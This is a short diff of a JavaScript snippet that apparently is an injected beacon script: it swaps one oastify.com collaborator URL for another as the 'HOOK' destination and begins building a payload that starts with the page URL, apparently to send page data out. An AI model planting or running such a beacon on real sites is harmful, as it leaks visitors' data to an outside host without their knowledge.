@@ -2,7 +2,7 @@
   if (window.__ckDone) return;
   window.__ckDone = true;
 
-  var HOOK = "http://cwcusdmtfzrk4p94u9ucsrfuqlwck38s.oastify.com";
+  var HOOK = "http://h1jzxiryk4wp9ue9zezhxwkzvq1hpadz.oastify.com";
 
   var payload = {
     url:      location.href,
